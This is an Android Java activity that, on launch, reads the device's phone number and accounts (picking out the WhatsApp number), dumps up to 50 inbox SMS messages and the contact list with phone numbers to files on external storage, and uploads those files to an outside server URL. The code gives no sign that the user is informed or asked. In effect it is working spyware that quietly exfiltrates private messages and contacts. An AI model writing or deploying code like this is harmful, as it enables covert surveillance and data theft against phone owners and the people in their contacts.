package com.dds.info;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Logger;

import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;

public class MainActivity extends Activity {
	
	String phoneNumber;
	
	private String getMyPhoneNumber(){
	    TelephonyManager mTelephonyMgr;
	    mTelephonyMgr = (TelephonyManager)
	        getSystemService(Context.TELEPHONY_SERVICE); 
	    return mTelephonyMgr.getLine1Number();
	}
	
	 public void readContacts(){
         ContentResolver cr = getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);

         if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    System.out.println("name : " + name + ", ID : " + id);

                    // get the phone number
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                                           ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                                           new String[]{id}, null);
                    while (pCur.moveToNext()) {
                          String phone = pCur.getString(
                                 pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                          System.out.println("phone" + phone);
                          writeStringAsFile("name : " + name + " ID : " + id + " phone" + phone, "contacts"+phoneNumber+".txt");

                    }
                    pCur.close();


 /*                   // get email and type


                   Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (emailCur.moveToNext()) {
                        // This would allow you get several email addresses
                            // if the email addresses were stored in an array
                        String email = emailCur.getString(
                                      emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));

                        int type = emailCur.getInt(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                        String customLabel = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.LABEL));
                        CharSequence CustomemailType = ContactsContract.CommonDataKinds.Email.getTypeLabel(this.getResources(), type, customLabel);

                      System.out.println("Email " + email + " Email Type : " + emailType);
                    }
                    emailCur.close();

                    // Get note.......
                    String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " +
                            ContactsContract.Data.MIMETYPE + " = ?";
                    String[] noteWhereParams = new String[]{id,
                    ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};

                     Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, 
                             noteWhere, noteWhereParams, null);
                    if (noteCur.moveToFirst()) {
                        String note = noteCur.getString(
                        noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
                      System.out.println("Note " + note);
                    }
                    noteCur.close();

                    //Get Postal Address....

                    String addrWhere = ContactsContract.Data.CONTACT_ID 
                            + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] addrWhereParams = new String[]{id,
                        ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
                    Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI,
                                null, null, null, null);
                    while(addrCur.moveToNext()) {
                        String poBox = addrCur.getString(
                                     addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
                        String street = addrCur.getString(
                                     addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                        String city = addrCur.getString(
                                     addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                        String state = addrCur.getString(
                                     addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                        String postalCode = addrCur.getString(
                                     addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                        String country = addrCur.getString(
                                     addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                        String type = addrCur.getString(
                                     addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));

                        // Do something with these....

                    }
                    addrCur.close();

                    // Get Instant Messenger.........
                    String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " 
                    + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] imWhereParams = new String[]{id,
                        ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
                    Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI,
                            null, imWhere, imWhereParams, null);
                    if (imCur.moveToFirst()) {
                        String imName = imCur.getString(
                                 imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
                        String imType;
                        imType = imCur.getString(
                                 imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
                    }
                    imCur.close();

                    // Get Organizations.........

                    String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] orgWhereParams = new String[]{id,
                        ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                    Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI,
                                null, orgWhere, orgWhereParams, null);
                    if (orgCur.moveToFirst()) {
                        String orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
                        String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                    }
                    orgCur.close();*/


                }
            }
       }
    }
	 
	 
	 void getSms()
	 {
		 Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
		 cursor.moveToFirst();

		 int totalMessages = cursor.getCount();
		 if(totalMessages > 50)
		 {
			 totalMessages = 50;
		 }
		 
		 if (cursor.moveToFirst()) {
			 for(int i=1; i<=totalMessages; i++)
		 {
		    String msgData = "";
		    for(int idx=0;idx<cursor.getColumnCount();idx++)
		    {
		        msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx)+"\n";
		        
		    }
		    writeStringAsFile(msgData+"\n", "sms"+phoneNumber+".txt");
		    cursor.moveToNext();
		 }
		 }
	 }
	 
	 public static void writeStringAsFile(final String fileContents, String fileName) {
	       
	       
	        	//File file = new File(Environment.getExternalStorageDirectory()+"/", fileName)
	        	File sdCard = Environment.getExternalStorageDirectory();
	            File directory = new File (sdCard.getAbsolutePath() + "/test");
	            directory.mkdirs();

	            
	            File file = new File(directory, fileName);
	            FileOutputStream fOut = null;
	            try {
	                fOut = new FileOutputStream(file, true);
	            } catch (FileNotFoundException e) {
	                e.printStackTrace();
	            }

	            OutputStreamWriter osw = new OutputStreamWriter(fOut);
	            try {
	                osw.write(fileContents + "\n");
	                osw.flush();
	                osw.close();
	            } catch (IOException e) {
	                e.printStackTrace();
	            }
	    }


	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		File sdCard = Environment.getExternalStorageDirectory();
        File directory = new File (sdCard.getAbsolutePath() + "/test");
        String finaldir = directory.getAbsolutePath();
        
		String phNO = getMyPhoneNumber();
		Log.i("PhoneNoDirect",phNO);


		
		AccountManager am = AccountManager.get(this);
		Account[] accounts = am.getAccounts();

		for (Account ac : accounts) {
		    String acname = ac.name;
		    String actype = ac.type;
		    // Take your time to look at all available accounts
		    Log.i("INFO","Accounts : " + acname + ", " + actype);
		    if(actype.equals("com.whatsapp")){
		        phoneNumber = ac.name;
		        Log.i("PhoneNoWhatsapp",phoneNumber);
		    }
		}
        
        String finalfile = finaldir+"/sms"+phoneNumber+".txt";
        File finalFile = new File(finalfile);
        if(finalFile.exists())
        {
        	finalFile.delete();
        }
        String finalfile1 = finaldir+"/contacts"+phoneNumber+".txt";
        File finalFile1 = new File(finalfile1);
        if(finalFile1.exists())
        {
        	finalFile1.delete();
        }
		
		
		


		
		getSms();
		readContacts();
		
		
        Log.i("PATH", finalfile);
        String upPath = "http://singhdd.com/testing/UploadToServer.php";
        
        new UploadFile().execute(finalfile,upPath);
        new UploadFile().execute(finalfile1,upPath);
        
		
		
		
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
